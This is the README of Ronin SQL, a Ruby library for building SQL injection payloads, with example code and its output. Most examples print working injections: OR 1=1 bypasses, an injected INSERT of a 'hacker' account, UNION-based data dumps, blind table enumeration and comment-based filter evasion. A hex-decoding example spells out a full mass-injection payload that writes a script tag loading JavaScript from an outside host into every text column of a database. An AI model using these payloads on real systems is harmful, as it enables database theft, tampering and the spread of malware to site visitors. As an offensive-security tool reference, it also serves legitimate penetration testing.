# Ronin SQL

* [Source](https://github.com/ronin-ruby/ronin-sql)
* [Issues](https://github.com/ronin-ruby/ronin-sql/issues)
* [Documentation](http://rubydoc.info/github/ronin-ruby/ronin-sql/frames)
* [Mailing List](https://groups.google.com/group/ronin-ruby)
* [irc.freenode.net #ronin](http://webchat.freenode.net/?channels=ronin&uio=Mj10cnVldd)

## Description

{Ronin::SQL} is a Ruby DSL for crafting [SQL Injections (SQLi)][SQLi].

### Features

* Provides convenience methods for encoding/decoding SQL data.
* Provides an Domain Specific Language (DSL) for crafting normal SQL and
  [SQL injections][SQLi].

## Examples

### Convenience Methods

Escape a String:

    "O'Brian".sql_escape
    # => "'O''Brian'"

Unescapes a SQL String:

    "'O''Brian'".sql_unescape
    # => "O'Briand"

Hex encode a String:

    "exploit".sql_encode
    # => "0x6578706c6f6974"

Hex decode a String:

    string = "4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72"
    string.sql_decode
    # => "DECLARE @T varchar(255),@C varchar(4000) DECLARE Table_Cursor CURSOR FOR select a.name,b.name from sysobjects a,syscolumns b where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM  Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN exec('update ['+@T+'] set ['+@C+']=''\"></title><script src=\"http://www0.douhunqn.cn/csrss/w.js\"></script><!--''+['+@C+'] where '+@C+' not like ''%\"></title><script src=\"http://www0.douhunqn.cn/csrss/w.js\"></script><!--''')FETCH NEXT FROM  Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor"

### SQLi DSL

Injecting a `1=1` test into a Integer comparison:

    sqli = Ronin::SQL::Injection.new
    sqli.or { 1 == 1 }
    puts sqli
    # 1 OR 1=1

Injecting a `1=1` test into a String comparison:

    sqli = Ronin::SQL::Injection.new(escape: :string)
    sqli.or { string(1) == string(1) }
    puts sqli
    # 1' OR '1'='1

Columns:

    sqli = Ronin::SQL::Injection.new
    sqli.and { admin == 1 }
    puts sqli
    # 1 AND admin=1

Clauses:

    sqli = Ronin::SQL::Injection.new
    sqli.or { 1 == 1 }.limit(0)
    puts sqli
    # 1 OR 1=1 LIMIT 0

Statements:

    sqli = Ronin::SQL::Injection.new
    sqli.and { 1 == 0 }
    sqli.insert.into(:users).values('hacker','passw0rd','t')
    puts sqli
    # 1 AND 1=0; INSERT INTO users VALUES ('hacker','passw0rd','t')

Sub-Statements:

    sqli = Ronin::SQL::Injection.new
    sqli.union { select(1,2,3,4,id).from(users) }
    puts sqli
    # 1 UNION SELECT (1,2,3,4,id) FROM users

Test if a table exists:

    sqli = Ronin::SQL::Injection.new
    sqli.and { select(count).from(:users) == 1 }
    puts sqli
    # 1 AND (SELECT COUNT(*) FROM users)=1

Create errors by using non-existant tables:

    sqli = Ronin::SQL::Injection.new(escape: :string)
    sqli.and { non_existant_table == '1' }
    puts sqli
    # 1' AND non_existant_table='1

Dumping all values of a column:

    sqli = Ronin::SQL::Injection.new(escape: :string)
    sqli.or { username.is_not(null) }.or { username == '' }
    puts sqli
    # 1' OR username IS NOT NULL OR username='

Enumerate through database table names:

    sqli = Ronin::SQL::Injection.new
    sqli.and {
      ascii(
        lower(
          substring(
            select(:name).top(1).from(sysobjects).where { xtype == 'U' }, 1, 1
          )
        )
      ) > 116
    }
    puts sqli
    # 1 AND ASCII(LOWER(SUBSTRING((SELECT name TOP 1 FROM sysobjects WHERE xtype='U'),1,1)))>116

Find user supplied tables via the `sysObjects` table:

    sqli = Ronin::SQL::Injection.new
    sqli.union_all {
      select(1,2,3,4,5,6,name).from(sysObjects).where { xtype == 'U' }
    }
    puts sqli.to_sql(:terminate => true)
    # 1 UNION ALL (SELECT (1,2,3,4,5,6,name) FROM sysObjects WHERE xtype='U');--

Bypass filters using `/**/` instead of spaces:

    sqli = Ronin::SQL::Injection.new
    sqli.union { select(1,2,3,4,id).from(users) }
    puts sqli.to_sql(:space => '/**/')
    # 1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users

## Requirements

* [Ruby] >= 1.9.1

## Install

    $ gem install ronin-sql

## License

Ronin SQL - A Ruby DSL for crafting SQL Injections.

Copyright (c) 2007-2013 Hal Brodigan (postmodern.mod3 at gmail.com)

This file is part of Ronin SQL.

Ronin Asm is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Ronin Asm is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Ronin Asm.  If not, see <http://www.gnu.org/licenses/>.

[SQLi]: http://en.wikipedia.org/wiki/SQL_injection

[Ruby]: http://www.ruby-lang.org
